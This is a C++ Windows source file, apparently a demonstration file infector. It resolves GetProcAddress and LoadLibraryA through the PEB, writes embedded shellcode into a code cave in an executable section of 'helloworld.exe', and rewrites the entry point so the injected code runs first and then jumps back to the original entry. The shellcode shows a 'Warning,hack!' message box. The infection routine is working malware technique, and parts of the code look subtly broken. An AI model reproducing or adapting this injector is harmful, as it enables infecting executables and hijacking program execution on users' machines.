#include<Windows.h>
#include<iostream>
#include<fstream>
using namespace std;

DWORD GetProcAddressAddr = 0;
DWORD LoadLibraryAAddr = 0;
DWORD ebp_zhen = 0;

BOOL  IsPeFile(LPVOID  ImageBase)   //�ж��Ƿ���PE�ļ��ṹ
{
 PIMAGE_DOS_HEADER  pDosHeader = NULL;
 PIMAGE_NT_HEADERS  pNtHeader  = NULL;
 if(!ImageBase)
  return FALSE;
 pDosHeader = (PIMAGE_DOS_HEADER) ImageBase;

 if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
  return FALSE;
 pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader+pDosHeader->e_lfanew);
 if(pNtHeader->Signature != IMAGE_NT_SIGNATURE )
  return  FALSE;
 return    TRUE;
}

PIMAGE_NT_HEADERS  GetNtHeader(LPVOID  ImageBase) //��ȡNT�ṹָ��
{
 PIMAGE_DOS_HEADER  pDosHeader = NULL;
 PIMAGE_NT_HEADERS  pNtHeader  = NULL;

 if(!IsPeFile(ImageBase))
  return  NULL;
 pDosHeader = (PIMAGE_DOS_HEADER)ImageBase;
 pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader+pDosHeader->e_lfanew);
 return    pNtHeader;
}

PIMAGE_FILE_HEADER  WINAPI  GetFileHeader(LPVOID  Imagebase)
{
 PIMAGE_FILE_HEADER  pFileHeader;
 PIMAGE_NT_HEADERS  pNtHeader = NULL;
 pNtHeader = GetNtHeader(Imagebase);
 if(!pNtHeader)
  return  NULL;
 pFileHeader = & pNtHeader->FileHeader; 
 return  pFileHeader;
}

PIMAGE_OPTIONAL_HEADER  GetOptionalHeader(LPVOID  ImageBase)
{
 PIMAGE_OPTIONAL_HEADER  pOptionHeader = NULL;
 PIMAGE_NT_HEADERS  pNtHeader = NULL;
 pNtHeader = GetNtHeader(ImageBase);
 if(!pNtHeader)
  return  NULL;
 pOptionHeader = & pNtHeader->OptionalHeader;
 return  pOptionHeader;
}




BOOL RvaToOffset(LPVOID lpMoudle,DWORD Rva)//��RVA��ַת��Ϊֱ��ƫ�Ƶ�ַ
{
 //��������洢ת�����ƫ��ֵ�ͽڱ���
 DWORD FileOffset;
 WORD nSectionNum;

 //ȡNT�ṹͷ
 IMAGE_NT_HEADERS  *pNTHead;
 pNTHead=GetNtHeader(lpMoudle);
 nSectionNum=pNTHead->FileHeader.NumberOfSections;

 //ȡ�ڱ�ṹͷ
 IMAGE_SECTION_HEADER *pSectionHead;
 pSectionHead=(IMAGE_SECTION_HEADER *)((DWORD)pNTHead+sizeof(IMAGE_NT_HEADERS));

 //ѭ���Ƚ�Rvaֵ����Ӧ�ڱ��ƫ��
 for(int i=0; i<nSectionNum; i++)
 {
  if((pSectionHead->VirtualAddress<=Rva) && (Rva<(pSectionHead->SizeOfRawData+pSectionHead->VirtualAddress)))
  {
   FileOffset=Rva-pSectionHead->VirtualAddress+pSectionHead->PointerToRawData;
   return FileOffset;
  }
  pSectionHead++;
 }
 return FALSE;
}



BOOL RvaToVirtualAddress(LPVOID lpMoudle,DWORD Rva)
{
 DWORD offset=RvaToOffset(lpMoudle,Rva);
 if(offset==NULL||offset==FALSE)
  return FALSE;
 return (DWORD)lpMoudle+offset;
}
 

void getfuncAddress(){
	__asm
    {
		push ebp
		mov ebp,esp
		mov eax,fs:[030h]  ;get PEB address
		mov eax,[eax+0ch]  ;PROCESS_ MODAULE_INFO
		mov esi,[eax+0ch]  ;InInitOrder.flinkģ���ʼ������
        mov eax, esi
        mov eax, [eax]; nt.dll
        mov eax, [eax]; kernel32.dll
        mov eax, dword ptr ds:[eax + 018h];
        mov ebp,eax
		mov ebp_zhen,ebp
		GetProAddess_fun:
			push ecx
            mov  esi,[ebp+3Ch]    ;ָ��PEͷ
            mov  edx,[esi+ebp+78h];ָ��PE������
            add  edx,ebp          ;�˴��ĵ�ַ�ǵ�����ĵ�ַ

            mov eax,[edx+0ch]   ;ָ��
            add eax,ebp
            mov  ecx,[edx+18h]  ;��ȡ�������������
            mov  ebx,[edx+20h]  ;ָ����������
            add  ebx,ebp

            Get_Function:
                dec ecx
                mov esi,[ebx+ecx*4];��һ��
                add esi,ebp

                mov eax,50746547h;PteG("GetP")
                cmp [esi],eax           
                jne Get_Function 

                mov eax,41636f72h;Acor("rocA")          
                cmp [esi+4],eax
                jne Get_Function

                mov ebx,[edx+24h]  ;��ת��AddressOfNameOrdinals������
                add ebx,ebp
                mov cx,[ebx+ecx*2] ;�˴��ҵ�����AddressOfNameOrdinals�е����

                mov ebx,[edx+1ch]  ;��ת��AddressofFunction����
                add ebx,ebp
                mov eax,[ebx+ecx*4];��ȡƫ�Ƶ�ַ
                add eax,ebp
                mov ebx,eax
				mov GetProcAddressAddr,eax
            pop  ecx

		GetLoadLibraryA_byfunc:
			xor ecx,ecx
			push 00000000h
			push 41797261h ; aryA
			push 7262694ch ; Libr
			push 64616f4ch ; Load
			push esp       ; "LoadLibraryA"
			push ebp       ; Kernel32 base address
			call ebx       ; GetProcAddress(LL)
			add esp,010h   ; pop "LoadLibraryA"
			mov ebx,eax
			mov LoadLibraryAAddr,eax
			;ebx�����ŵ�ַ
		pop ebp
	}
}

VOID HandleSessionTable(LPVOID file,LPVOID base)
{
 char funcname[16]="MessageBoxA";
 char DLLname[16]="user32.dll";
 char Caption[16]="Warning,hack!";
 char Content[16]="This is test";
 
 char codes[]="\x53\x56\x57\x55\x8B\xEC\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x70\x0C\x8B\xC6\x8B\x00\x8B\x00\x3E\x8B\x40\x18\x8B\xE8\x51\x8B\x75\x3C\x8B\x54\x2E\x78\x03\xD5\x8B\x42\x0C\x03\xC5\x8B\x4A\x18\x8B\x5A\x20\x03\xDD\x49\x8B\x34\x8B\x03\xF5\xB8\x47\x65\x74\x50\x39\x06\x75\xF1\xB8\x72\x6F\x63\x41\x39\x46\x04\x75\xE7\x8B\x5A\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\x8B\xD8\x8B\xF8\x59\x33\xC9\x6A\x00\x68\x61\x72\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\x55\xFF\xD3\x83\xC4\x10\x8B\xD8\x8B\xF3\x33\xC9\x68\x6C\x6C\x00\x00\x68\x33\x32\x2E\x64\x68\x75\x73\x65\x72\x54\xFF\xD6\x83\xC4\x0C\x8B\xD8\x68\x6F\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4D\x65\x73\x73\x54\x53\xFF\xD7\x83\xC4\x0C\x8B\xD8\x6A\x40\x6A\x00\x6A\x00\x6A\x00\xFF\xD3\x5D\x5F\x5E\x33\xC0\x5B\xC3";
 /**************************************************************
 ��������Ϊshellcode���֣����ڲ��뵽��ִ�еĴ���ڵ��У�
 ���ȡ��ʽΪʹ�û��������ɿ�ִ�е�Դ���򣬽���ʹ��IDA PRO
 �򿪣����ҳ�����ڵ�������ַ����������ȡ16���Ʊ��ֵĴ��뼴�ɡ�
 ��shellcode�Ĺ�����Ҫ�ǻ�ȡGetProcAddress(),LoadLibraryA(),user32.dll,
 Kernel32.dll,MessageBoxA(),�⼸�����������ӿ�ļ��ص�ַ����ʹ����Щ��ַ
 ���г�����ã��ڴ˻����ϼ������ֲ�뵽��������Ĺ��ܡ�
 **************************************************************/

 int datalength=16*4+8;
 int codeslength=sizeof(codes)-1;
 
 IMAGE_NT_HEADERS *nthead = GetNtHeader(base);
 IMAGE_SECTION_HEADER *sessionhead = (IMAGE_SECTION_HEADER*)((DWORD)nthead+sizeof(IMAGE_NT_HEADERS));
 if(sessionhead -> VirtualAddress==NULL)
  return;

 DWORD sessionnum=nthead->FileHeader.NumberOfSections;
 IMAGE_SECTION_HEADER *p=sessionhead;
 DWORD sFileSize=GetFileSize(base,NULL);

 for(int i=0;i<sessionnum;i++)
 {
  cout<<(char*)p->Name<<" " <<(int)p->SizeOfRawData-(int)p->Misc.VirtualSize<<endl;
  IMAGE_SECTION_HEADER tmp;//=sessionhead;
  memcpy(&tmp,p,sizeof(IMAGE_SECTION_HEADER));
   
  if(((int)p->SizeOfRawData - (int)p->Misc.VirtualSize) > (codeslength + datalength) &&(p->Characteristics & IMAGE_SCN_MEM_EXECUTE))
  {
	   DWORD datavirtualbase=p->VirtualAddress+p->Misc.VirtualSize;
	   DWORD datafileoffect=p->PointerToRawData+p->Misc.VirtualSize;

	   SetFilePointer(file,datafileoffect,NULL,FILE_BEGIN);
	   WriteFile(file,funcname,16,0,0);
	   WriteFile(file,DLLname,16,0,0);
	   WriteFile(file,Caption,16,0,0);
	   WriteFile(file,Content,16,0,0);
	   WriteFile(file,&LoadLibraryAAddr,4,0,0);
	   WriteFile(file,&GetProcAddressAddr,4,0,0);

	   DWORD codevirtualbase = p->VirtualAddress + p->Misc.VirtualSize + datalength;
	   DWORD cedefileoffset = p->PointerToRawData + p->Misc.VirtualSize + datalength;

	   p->Misc.VirtualSize += (codeslength + datalength);
	   SetFilePointer(file, cedefileoffset, NULL, FILE_BEGIN);
	   DWORD oldentry = nthead->OptionalHeader.AddressOfEntryPoint;
	   DWORD JMPOffset = oldentry - (codevirtualbase + codeslength-5);
	   memcpy(codes + codeslength-4, &JMPOffset, sizeof(DWORD));
	   nthead->OptionalHeader.AddressOfEntryPoint = codevirtualbase;
	   DWORD writesize = 0;
	   SetFilePointer(file,cedefileoffset,NULL,FILE_BEGIN);
	   if(!WriteFile(file,codes,codeslength,&writesize,0) )
	   {
			TCHAR  *buffer;
			::FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,GetLastError(),0,( LPTSTR )&buffer,0,NULL );
			MessageBox(0,buffer,"ok",0);
	   }
	   cout<<"success"<<endl;
	   break;
  }
  p++;
 }
}

void main()
{
getfuncAddress();
 HANDLE  hFile = CreateFile("helloworld.exe",// open  pe file 
  GENERIC_READ|GENERIC_WRITE,                // open for reading 
  NULL,						// share for reading 
  NULL,                     // no security 
  OPEN_EXISTING,            // existing file only 
  FILE_ATTRIBUTE_NORMAL,    // normal file 
  NULL);                    // no attr. template 
 
 HANDLE hFileMap = CreateFileMapping(hFile,NULL,PAGE_READWRITE,0,0,NULL);
 if(!hFileMap )
 {
  TCHAR  *buffer ;
  ::FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,GetLastError(),0,( LPTSTR )&buffer,0,NULL );
  MessageBox(0,buffer,"ok",0);
 }
 LPVOID  lpMemory = MapViewOfFile(hFileMap,FILE_MAP_READ|FILE_MAP_WRITE ,NULL,NULL,NULL);

 if(IsPeFile(lpMemory))
 {
  //�ļ�����
  cout<<"Ŀ���ļ��ɸ�Ⱦ."<<endl;
  IMAGE_NT_HEADERS *nthead=GetNtHeader(lpMemory);
  IMAGE_OPTIONAL_HEADER32 *image=GetOptionalHeader(lpMemory);
  cout<<"DataDirectory num:"<<image->NumberOfRvaAndSizes<<endl;
  HandleSessionTable(hFile,lpMemory);
  cout<<"��Ⱦ���"<<endl;
 }
 else
    cout<<"Ŀ���ļ����ɴ�."<<endl;
 UnmapViewOfFile(lpMemory);
 CloseHandle(hFileMap);
 CloseHandle(hFile);

 system("pause");
}